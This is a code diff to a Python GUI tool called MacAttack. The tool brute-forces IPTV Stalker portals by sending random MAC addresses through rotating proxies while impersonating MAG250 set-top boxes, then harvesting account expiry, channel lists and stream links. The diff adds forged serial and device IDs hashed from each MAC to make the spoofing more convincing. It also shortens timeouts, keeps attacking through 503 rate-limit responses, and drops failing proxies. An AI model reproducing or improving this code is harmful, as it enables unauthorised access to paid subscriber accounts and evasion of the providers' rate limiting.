@@ -1,3 +1,4 @@
+import hashlib
 import os
 import time
 import re
@@ -21,7 +22,7 @@ import configparser
 from requests.adapters import HTTPAdapter
 from requests.packages.urllib3.util.retry import Retry
 
-#logging.basicConfig(level=logging.DEBUG)
+logging.basicConfig(level=logging.DEBUG)
 
 def get_token(session, url, mac_address):
     try:
@@ -1529,8 +1530,6 @@ class MacAttack(QMainWindow):
         self.error_text.setHtml("")
         self.error_text.setHtml("""
         Error LOG:<br>It's normal for errors to appear down here.
-        <br>If <b>503 Rate Limited</b> errors are getting spammed by multiple proxies, 
-        <br>Lower the speed, then restart the attack.
         """)
         self.error_text.setReadOnly(True)
         self.error_text.setFont(monospace_font)
@@ -1574,8 +1573,7 @@ class MacAttack(QMainWindow):
 
     def load_settings(self):
         """Load user settings from the configuration file and apply them to the UI elements, including the active tab."""
-        import os
-        import configparser
+
         
         user_dir = os.path.expanduser('~')
         file_path = os.path.join(user_dir, 'evilvir.us', 'MacAttack.ini')
@@ -1729,7 +1727,26 @@ class MacAttack(QMainWindow):
                 proxies = {"http": selected_proxy, "https": selected_proxy}
             else:
                 selected_proxy = "Your Connection"
-            mac = self.RandomMacGenerator()  # Generate a random MAC
+            mac = self.RandomMacGenerator()  # Generate a random MAC 
+
+            #convert the mac into various hashes, if anything this will add randomness to the requests
+            mac_md5 = hashlib.md5(mac.encode('utf-8')).hexdigest().upper()
+            mac_sha256 = hashlib.sha256(mac.encode('utf-8')).hexdigest().upper()
+            mac_sha1 = hashlib.sha1(mac.encode('utf-8')).hexdigest()
+
+            
+            serial = mac_md5 #cant be right, looks like the serial is only supposed to be 13 digits from what i am reading
+            device_id = mac_sha256
+            # device_id2: First 13 digits of MD5 + MAC, then encoded in SHA256, according to 
+            device_id2_input = serial[:13] + mac  # Combine first 13 digits of MD5 + MAC
+            device_id2 = hashlib.sha256(device_id2_input.encode('utf-8')).hexdigest().upper()  # SHA256 of the combined input
+
+            #logging the results
+            logging.debug(f"Serial: {serial}")
+            logging.debug(f"Device ID: {device_id}")
+            logging.debug(f"Device ID2: {device_id2}") 
+            
+            
             if not proxies:
                 self.update_mac_label_signal.emit(f"Testing MAC: {mac}")
             if proxies:
@@ -1740,13 +1757,13 @@ class MacAttack(QMainWindow):
                 #s.cookies.update({'mac': mac})
                 
                 s.cookies.update({
-                    "adid": "2bdb5336edffec452536be317345eb2748e18f87",
+                    "adid": mac_sha1,
                     "debug": "1",
-                    "device_id2": "F4A17F3CD21793B7C840DEEA360B11910141827E951DAEB74A3B7058C6B80F37",
-                    "device_id": "493A0F82C1BF86406DAD0191F60870BDFD4A9DCE7911404D51DAAED829B357AF",
+                    "device_id2": device_id2,
+                    "device_id": device_id,
                     "hw_version": "1.7-BD-00",
                     "mac": mac,
-                    "sn": "1F2E73918FED8",
+                    "sn": serial[:13], #cut to 13 digits
                     "stb_lang": "en",
                     "timezone": "America/Los_Angeles",
                 })
@@ -1764,7 +1781,7 @@ class MacAttack(QMainWindow):
                 if proxies:
                     s.proxies.update(proxies)
 
-                res = s.get(url, timeout=30, allow_redirects=False)
+                res = s.get(url, timeout=10, allow_redirects=False)
 
                 if res.text:
                     data = json.loads(res.text)
@@ -1777,7 +1794,7 @@ class MacAttack(QMainWindow):
                         "X-User-Agent": "Model: MAG250; Link: WiFi",
                     }
 
-                    res2 = s.get(url2, headers=headers, timeout=30, allow_redirects=False)
+                    res2 = s.get(url2, headers=headers, timeout=10, allow_redirects=False)
 
                     if res2.text:
                         data = json.loads(res2.text)
@@ -1786,12 +1803,12 @@ class MacAttack(QMainWindow):
                             expiry = data['js']['phone']
 
                             url3 = f"{self.base_url}/portal.php?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
-                            res3 = s.get(url3, headers=headers, timeout=30, allow_redirects=False)
+                            res3 = s.get(url3, headers=headers, timeout=10, allow_redirects=False)
 
                             count = 0
                             if res3.status_code == 200:
                                 url4 = f"{self.base_url}/portal.php?type=itv&action=create_link&cmd=http://localhost/ch/1_&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml"
-                                res4 = s.get(url4, headers=headers, timeout=30, allow_redirects=False)
+                                res4 = s.get(url4, headers=headers, timeout=10, allow_redirects=False)
                                 data4 = json.loads(res4.text)
 
                                 cmd_value4 = data4["js"]["cmd"].replace("ffmpeg ", "", 1)
@@ -1877,9 +1894,8 @@ class MacAttack(QMainWindow):
                             #self.update_error_text_signal.emit(f"No JSON response for MAC {mac}")
                             logging.debug(f"No JSON response for MAC {mac}")
    
-                
+            #Try failed because data was non json    
             except (json.decoder.JSONDecodeError, requests.exceptions.RequestException, TypeError) as e:
-                # Now catch the error when res2 fails
                 if "Expecting value" in str(e):
                     logging.debug("Raw Response Content:\n%s", res.text)
                     if "ERR_ACCESS_DENIED" in res.text:
@@ -1979,6 +1995,22 @@ class MacAttack(QMainWindow):
                             self.proxy_error_counts[selected_proxy] += 1                       
                         self.update_error_text_signal.emit(f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>DNS resolution error</b> DNS Issue with proxy")
                         self.remove_proxy(selected_proxy, self.proxy_error_counts) # remove the proxy if it exceeds the allowed error count
+                    elif "302 Found" in res.text:
+                        # Track error count for the proxy
+                        if selected_proxy not in self.proxy_error_counts:
+                            self.proxy_error_counts[selected_proxy] = 1
+                        else:
+                            self.proxy_error_counts[selected_proxy] += 1                       
+                        self.update_error_text_signal.emit(f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>302 Found</b> Proxy tried to redirect us")
+                        self.remove_proxy(selected_proxy, self.proxy_error_counts) # remove the proxy if it exceeds the allowed error count
+                    elif "504 Gateway" in res.text:
+                        # Track error count for the proxy
+                        if selected_proxy not in self.proxy_error_counts:
+                            self.proxy_error_counts[selected_proxy] = 1
+                        else:
+                            self.proxy_error_counts[selected_proxy] += 1                       
+                        self.update_error_text_signal.emit(f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>504 Gateway Time-out</b> Proxy timed out")
+                        self.remove_proxy(selected_proxy, self.proxy_error_counts) # remove the proxy if it exceeds the allowed error count
                     elif "504 DNS look up failed" in res.text:
                         # Track error count for the proxy
                         if selected_proxy not in self.proxy_error_counts:
@@ -2034,10 +2066,7 @@ class MacAttack(QMainWindow):
                     elif "503 Service" in res.text or "The page is temporarily unavailable" in res.text:
                         self.update_error_text_signal.emit(f"Error for Portal: <b>503 Rate Limited</b> {selected_proxy}")
                         self.temp_remove_proxy(selected_proxy)
-                        break
-                    #elif "Backend not available" in res.text:
-                    #    self.update_error_text_signal.emit(f"Error for Portal: {mac} :<b>Backend not available</b>")
-                            #self.error_count = 0
+                        #break
                     elif "Connection to server failed" in res.text:
                         # Track error count for the proxy
                         if selected_proxy not in self.proxy_error_counts:
@@ -2067,14 +2096,11 @@ class MacAttack(QMainWindow):
                         self.remove_proxy(selected_proxy, self.proxy_error_counts)
 
                     
-                    elif "REQUEST_METHOD = GET" in res.text:
+                    elif mac in res.text:
                         #good result, reset errors
                         self.proxy_error_counts[selected_proxy] = 0
                     
-                    
-                    
-                    
-                    
+             
                     else:
                         
                             #self.update_error_text_signal.emit(f"Error for MAC {mac}: {str(e)}")
@@ -2154,7 +2180,6 @@ class MacAttack(QMainWindow):
             soundplayer.play()
 
             # Optional: Wait for the sound to finish (based on media length)
-            import time
             duration = soundplayer.get_length() / 1000  # Convert milliseconds to seconds
             if duration > 0:  # Only wait if duration is properly determined
                 time.sleep(duration)
